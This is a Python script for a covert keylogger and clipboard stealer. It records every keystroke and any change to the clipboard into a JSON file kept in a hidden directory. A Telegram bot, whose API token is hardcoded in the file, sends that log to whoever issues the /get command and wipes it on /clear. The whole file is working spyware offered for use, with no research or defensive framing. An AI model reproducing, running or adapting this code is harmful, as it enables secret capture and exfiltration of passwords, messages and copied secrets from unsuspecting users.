import os
import json
import pyperclip
from pynput import keyboard
from datetime import datetime, timedelta
import platform
import time
from telegram import Update, Bot
from telegram.ext import Updater, CommandHandler, CallbackContext
import logging

# Initialize Telegram bot with token
TELEGRAM_BOT_TOKEN = "7633258412:AAGFGEgmR6MagBUXOwbdCxTVHhfRryA5OPs"
bot = Bot(TELEGRAM_BOT_TOKEN)

# Set up logging for Telegram bot
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Directory and file setup
def get_hidden_dir():
    if os.name == 'nt':  # Windows
        path = os.path.join(os.environ['ProgramData'], 'hidden_dir')
    else:  # Linux/macOS
        path = os.path.expanduser('~/.hidden_dir')
    if not os.path.exists(path):
        os.makedirs(path)
    return path

json_file_path = os.path.join(get_hidden_dir(), 'keylog.json')

# Initialize or reset JSON log file
def initialize_json_file():
    with open(json_file_path, 'w') as file:
        json.dump([], file)

# Load existing data from JSON file
def load_json_data():
    with open(json_file_path, 'r') as file:
        return json.load(file)

# Save data to JSON file
def save_json_data(data):
    with open(json_file_path, 'w') as file:
        json.dump(data, file, indent=4)

# Check if Caps Lock is active (cross-platform)
def is_capslock_on():
    if platform.system() == 'Windows':
        import ctypes
        return ctypes.WinDLL('User32.dll').GetKeyState(0x14) != 0
    elif platform.system() == 'Darwin':  # macOS
        import Quartz
        caps_lock_state = Quartz.CGEventSourceFlagsState(Quartz.kCGEventSourceStateHIDSystemState)
        return (caps_lock_state & Quartz.kCGEventFlagMaskAlphaShift) != 0
    else:
        import subprocess
        xset_output = subprocess.check_output(['xset', 'q']).decode()
        return 'Caps Lock:   on' in xset_output

# Variable to track the last timestamp and clipboard content
last_timestamp = datetime.now() - timedelta(minutes=15)
last_clipboard_content = None

# Function to log keystrokes with timestamp every 15 minutes
def log_keystroke(key):
    global last_timestamp

    current_time = datetime.now()
    key_data = str(key).replace("'", "")

    if key == keyboard.Key.space:
        key_data = ' '
    elif key == keyboard.Key.enter:
        key_data = '\n'

    if is_capslock_on() and key_data.isalpha():
        key_data = key_data.upper()

    data = load_json_data()

    if current_time - last_timestamp >= timedelta(minutes=15):
        data.append({
            'timestamp': str(current_time),
            'event': 'Timestamp logged'
        })
        last_timestamp = current_time

    data.append({
        'key': key_data
    })

    save_json_data(data)

# Function to log clipboard content only when it changes
def log_clipboard():
    global last_clipboard_content

    current_time = datetime.now()
    clipboard_data = pyperclip.paste()

    if clipboard_data != last_clipboard_content and clipboard_data:
        data = load_json_data()
        data.append({
            'timestamp': str(current_time),
            'copied': clipboard_data
        })
        save_json_data(data)
        last_clipboard_content = clipboard_data

# Listener for keyboard events
def on_press(key):
    try:
        log_keystroke(key)
    except Exception as e:
        pass

# Telegram bot command handlers
def start(update: Update, context: CallbackContext):
    update.message.reply_text("Hello! Here are the commands you can use:\n/get - Get the JSON file\n/clear - Delete and reset the JSON file")

def get_json(update: Update, context: CallbackContext):
    if os.path.exists(json_file_path):
        update.message.reply_document(open(json_file_path, 'rb'))
    else:
        update.message.reply_text("JSON file not found.")

def clear_json(update: Update, context: CallbackContext):
    if os.path.exists(json_file_path):
        os.remove(json_file_path)
        initialize_json_file()  # Recreate the JSON file after deletion
        update.message.reply_text("JSON file deleted and reset.")
    else:
        initialize_json_file()  # Ensure a new JSON file is created if missing
        update.message.reply_text("No JSON file to delete. A new file has been created.")

# Run keyboard listener
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Periodically check clipboard content (every 5 seconds)
def clipboard_loop():
    while True:
        log_clipboard()
        time.sleep(5)

# Set up the Telegram bot handlers
def main():
    updater = Updater(TELEGRAM_BOT_TOKEN)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("get", get_json))
    dp.add_handler(CommandHandler("clear", clear_json))

    # Start polling for Telegram commands
    updater.start_polling()

    # Start the clipboard loop
    clipboard_loop()

if __name__ == '__main__':
    # Initialize JSON file on startup if it doesn't exist
    if not os.path.exists(json_file_path):
        initialize_json_file()

    main()
